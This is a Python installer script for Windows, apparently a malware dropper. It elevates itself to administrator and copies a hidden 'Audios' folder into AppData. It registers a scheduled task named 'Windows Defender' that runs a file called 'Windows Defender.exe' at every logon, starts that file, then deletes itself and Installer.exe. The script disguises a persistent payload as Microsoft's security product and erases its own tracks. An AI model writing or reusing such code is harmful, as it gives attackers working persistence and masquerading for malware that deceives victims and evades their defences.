import os
import subprocess
import shutil
import winshell
from os import remove
from sys import argv
import datetime
import win32com.client
import ctypes, sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Code of your program here
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
else:
  startup = winshell.startup()

  path = os.getenv('APPDATA') + "\\Microsoft\\Audios"
  print(path)
  if os.path.exists(path):
    shutil.rmtree(path)
  shutil.copytree(os.getcwd() + "\\Audios", path)
  shutil.rmtree(os.getcwd() + "\\Audios")

  manager_path = f'{path}\\Windows Defender.exe'

  #Scheduler
  scheduler = win32com.client.Dispatch('Schedule.Service')
  scheduler.Connect()
  root_folder = scheduler.GetFolder('\\')
  task_def = scheduler.NewTask(0)

  # Create trigger
  TASK_TRIGGER_LOGON = 9
  trigger = task_def.Triggers.Create(TASK_TRIGGER_LOGON)

  # Create action
  TASK_ACTION_EXEC = 0
  action = task_def.Actions.Create(TASK_ACTION_EXEC)
  action.ID = 'DefenderID'
  action.Path = manager_path

  # Set parameters
  task_def.RegistrationInfo.Description = 'Windows Defender'
  task_def.Settings.Enabled = True
  task_def.Settings.StopIfGoingOnBatteries = False
  task_def.Settings.Priority = 0

  # Register task
  # If task already exists, it will be updated
  TASK_CREATE_OR_UPDATE = 6
  TASK_LOGON_NONE = 0
  root_folder.RegisterTaskDefinition(
      'Windows Defender',  # Task name
      task_def,
      TASK_CREATE_OR_UPDATE,
      '',  # No user
      '',  # No password
      TASK_LOGON_NONE)

  subprocess.Popen(manager_path, shell=False)
  remove(argv[0])
  os.remove(os.getcwd() + "\\Installer.exe")